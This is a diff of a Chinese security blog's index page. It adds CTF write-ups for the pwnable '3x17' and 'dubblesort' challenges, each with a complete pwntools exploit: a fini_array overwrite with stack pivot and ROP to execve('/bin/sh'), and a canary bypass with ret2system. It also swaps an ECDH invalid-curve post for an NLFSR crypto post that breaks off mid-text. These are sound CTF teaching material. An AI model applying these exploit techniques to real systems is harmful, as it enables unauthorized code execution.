@@ -246,6 +246,177 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pwnable_3x17" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/25/pwnable_3x17/" class="article-date">
+      <time datetime="2020-10-26T06:15:19.752Z" itemprop="datePublished">2020-10-25</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/25/pwnable_3x17/">pwnable_3x17</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>熟悉start函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A50                 public start</span><br><span class="line">.text:0000000000401A50 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A50 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A50                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A52                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A55                 pop     rsi</span><br><span class="line">.text:0000000000401A56                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A59                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A5D                 push    rax</span><br><span class="line">.text:0000000000401A5E                 push    rsp</span><br><span class="line">.text:0000000000401A5F                 mov     r8, offset sub_402960</span><br><span class="line">.text:0000000000401A66                 mov     rcx, offset loc_4028D0</span><br><span class="line">.text:0000000000401A6D                 mov     rdi, offset sub_401B6D</span><br><span class="line">.text:0000000000401A74                 db      67h</span><br><span class="line">.text:0000000000401A74                 call    sub_401EB0</span><br><span class="line">.text:0000000000401A7A                 hlt</span><br><span class="line">.text:0000000000401A7A ; &#125; &#x2F;&#x2F; starts at 401A50</span><br><span class="line">.text:0000000000401A7A start           endp</span><br></pre></td></tr></table></figure>
+<p>对应于有符号的start函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400890 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400890 ; __unwind &#123;</span><br><span class="line">.text:0000000000400890                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400892                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400895                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400896                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400899                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040089D                 push    rax</span><br><span class="line">.text:000000000040089E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040089F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004008A6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004008AD                 mov     rdi, offset main ; main</span><br><span class="line">.text:00000000004008B4                 call    __libc_start_main</span><br><span class="line">.text:00000000004008B4 _start          endp</span><br></pre></td></tr></table></figure>
+<p>不难发现，r8寄存器中存放的是__libc_csu_fini函数地址，rcx中存访的是__libc_csu_init，rdi中存放main。其函数声明如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(<span class="keyword">int</span> (main) (<span class="keyword">int</span>, <span class="keyword">char</span> , <span class="keyword">char</span> ), <span class="keyword">int</span> argc, <span class="keyword">char</span> * ubp_av, <span class="keyword">void</span> (init) (<span class="keyword">void</span>), <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>), <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>), <span class="keyword">void</span> ( stack_end));</span><br></pre></td></tr></table></figure>
+<h3 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h3><p>start函数流程</p>
+<p>start -&gt; _libc_start_main -&gt; libc_csu_init(init_array) -&gt; main -&gt; libc_csu_finit(fini_array) -&gt; exit(main_ret) </p>
+<p>这里要注意的是，<code>_init_array</code>执行顺序是下标由小到大，<code>_fini_array</code>执行顺序是下标由大到小。 </p>
+<p>因此可以画为</p>
+<ul>
+<li>.init</li>
+<li>.init_array[0]</li>
+<li>.init_array[1]</li>
+<li>…</li>
+<li>.init_array[n]</li>
+<li>main</li>
+<li>.fini_array[n]</li>
+<li>…</li>
+<li>.fini_array[1]</li>
+<li>.fini_array[0]</li>
+<li>.fini</li>
+</ul>
+<h3 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h3><p>改fini_array使程序循环执行main函数</p>
+<p>这里的操作是将fini_array[1]改为main函数首地址，fini_array[0]则改为libc_csu_finit函数首地址。这样程序在执行玩main后会执行libc_csu_finit，其中libc_csu_finit函数会首先执行main，然后又是执行libc_csu_finit函数。因此，会陷入死循环。</p>
+<h3 id="知识点四"><a href="#知识点四" class="headerlink" title="知识点四"></a>知识点四</h3><p>栈迁移</p>
+<p>这里的栈迁移需要观察libc_csu_finit函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 sub_402960      proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: sub_402960+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; 调用fini_array的函数</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: sub_402960+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; &#x2F;&#x2F; starts at 402960</span><br><span class="line">.text:000000000040299C sub_402960      endp</span><br></pre></td></tr></table></figure>
+<p>对照glibc源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="keyword">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>仔细观察可以发现，程序一开始会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0 ; fini_array</span><br></pre></td></tr></table></figure>
+<p>然后会调用fini_array中函数，最后返回libc_csu_finit，并将原rbp弹出（即恢复rbp）</p>
+<p>所以这里我们在fini_array中可以进行栈迁移，例如我们将fini_array[0]对应的函数改为如下汇编</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C4B                 leave</span><br><span class="line">.text:0000000000401C4C                 retn</span><br></pre></td></tr></table></figure>
+<p>其中leave对应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp,rbp</span><br><span class="line">pop     rbp</span><br></pre></td></tr></table></figure>
+<p>在执行mov rsp,rbp时，由于rbp为0x4B40F0，因此rsp也会变为0x4B40F0。然后执行pop rbp，此时rsp为0x4B40F8，因此rip就会变为内存0x4B4108上的值，并跳转进行执行，此时rsp为0x4B4100。这里0x4B4108即为fini_array[1]，我们将fini_array[1]改写为main后保持不变，而将fini_array[0]，即0x4B40F0改为leave; ret。这样，完成栈迁移后会首先执行main函数，但这无关紧要，因为main函数执行完后会恢复堆栈，即执行完main后rsp仍然在0x4B4100，就可以开始我们的rop了。</p>
+<h3 id="知识点五"><a href="#知识点五" class="headerlink" title="知识点五"></a>知识点五</h3><p>rop构造execve(“/bin/sh”)</p>
+<p>查看x86-64下的系统调用，可知需要设置寄存器为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax&#x3D;0x3b</span><br><span class="line">rdi&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;字符串的地址</span><br><span class="line">rsi&#x3D;0</span><br><span class="line">rdx&#x3D;0</span><br></pre></td></tr></table></figure>
+<p>最终构造出完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_</span><span class="params">(addr, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">    p.send(str(addr))</span><br><span class="line">    p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x000000000044a30a : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x000000000047e5d6 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401696 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000471db5 : syscall ; ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># stack layout</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4b4100 0x44a30a</span></span><br><span class="line"><span class="string">0x4b4108 0</span></span><br><span class="line"><span class="string">0x4b4110 0x47e5d6</span></span><br><span class="line"><span class="string">0x4b4118 0x3b</span></span><br><span class="line"><span class="string">0x4b4120 0</span></span><br><span class="line"><span class="string">0x4b4128 '/bin/sh\x00'</span></span><br><span class="line"><span class="string">0x4b4130 0x401696</span></span><br><span class="line"><span class="string">0x4b4138 0x4b4128 (addr of 'bin/sh\x00')</span></span><br><span class="line"><span class="string">0x4b4138 0x471db5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line"></span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(libc_csu_fini)+p64(main))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span>, p64(<span class="number">0x44a30a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x47e5d6</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>, p64(<span class="number">0x3b</span>) + p64(<span class="number">0</span>) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">send_(<span class="number">0x4B40F0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>, p64(<span class="number">0x401696</span>) + p64(<span class="number">0x4b4128</span>) + p64(<span class="number">0x471db5</span>))</span><br><span class="line">send_(<span class="number">0x4B40F0</span>, p64(leave_ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwnable_dubblesort" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/23/pwnable_dubblesort/" class="article-date">
+      <time datetime="2020-10-23T07:00:00.000Z" itemprop="datePublished">2020-10-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/23/pwnable_dubblesort/">pwnable.tw dubblesort</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p> 查看逻辑，发现主要为冒泡排序。漏洞点为两个，第一个比较明显，就是在输入数字的时候存在栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;v12);</span><br><span class="line">v3 = v12;</span><br><span class="line"><span class="keyword">if</span> ( v12 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = &amp;v13;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);</span><br><span class="line">    ++v5;</span><br><span class="line">    v3 = v12;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &gt; v5 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二点比较隐蔽，在输入name后，程序会打印name，但是这里就存在泄露。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br></pre></td></tr></table></figure>
+<p>因为read时不会给buf带上\x00，因此就会泄露栈上的后续地址的内容。通过调试，可以看到在输入的字符串后的第25个字节开始就是和libc地址有关的信息</p>
+<p><img src="/2020/10/23/pwnable_dubblesort/Users\msi1\AppData\Local\Temp\1603693654936.png" alt="1603693654936"></p>
+<p>同时通过查看vmmap可以计算出两者的地址偏移值为0x1b0000</p>
+<p><img src="/2020/10/23/pwnable_dubblesort/Users\msi1\AppData\Local\Temp\1603693801036.png" alt="1603693801036"></p>
+<p>有了libc基址后我们就可以愉快的计算出system和/bin/sh的地址，完成rop。</p>
+<p>但是查看程序开启的保护，发现有canary，这导致栈溢出无法进行，因为我们不知道栈上的magic num值。于是这里需要一个技巧（网上查到的）</p>
+<h3 id="scanf中的一个机制"><a href="#scanf中的一个机制" class="headerlink" title="scanf中的一个机制"></a>scanf中的一个机制</h3><p>当我们输入+或者-号时程序会读取成功，但同时不会对变量值进行赋值，这样就能保证在对magic_num进行赋值时我们可以保持原来的值不变就能成功绕过canary保护。</p>
+<p>最后在进行rop的时候由于有canary，可能并不是很清楚我们需要溢出多少个字节，这时候我们可以借助gdb调试功能进行计算或者直接利用反汇编代码查看main函数的esp指针变化情况。</p>
+<p>最终完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"name :"</span>, <span class="string">"A"</span>*(<span class="number">4</span>*<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">addr = u32(p.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr - <span class="number">0x1b0000</span></span><br><span class="line">addr_system = libc_base + <span class="number">0x3a940</span></span><br><span class="line">addr_shell = libc_base + <span class="number">0x158e8b</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"sort :"</span>, str(<span class="number">6</span>*<span class="number">4</span>+<span class="number">1</span>+<span class="number">7</span>+<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>*<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, <span class="string">"+"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"number : "</span>, str(addr_system<span class="number">-1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">"number : "</span>, str(addr_shell))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-pwnable_calc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -649,10 +820,10 @@
 
 
   
-    <article id="post-De1CTF[2020]-ECDH" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-De1CTF[2020]-NLFSR" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/05/11/De1CTF%5B2020%5D-ECDH/" class="article-date">
+      <a href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/" class="article-date">
       <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
 </a>
 
@@ -668,7 +839,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-ECDH/">De1CTF[2020]-ECDH</a>
+      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/">De1CTF[2020]-NLFSR</a>
     </h1>
   
 
@@ -678,11 +849,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>定位到题目源码中最关键的部分——密钥交换</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">	r = zero</span><br><span class="line">	tmp = p</span><br><span class="line">	<span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">	    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">	        r = add(r,tmp)</span><br><span class="line">	    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">		self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">		x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">		y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		key = (x,y)</span><br><span class="line">		result = mul(self.secret,key)</span><br><span class="line">		self.key = self.pointToKeys(result)</span><br><span class="line">		self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure>
-<p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p>
-<p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p>
-<p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>
+        <p>首先看一下题目源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+<p>可以看出这个属于非线性组合生成器 </p>
+<p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p>
+<p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p>
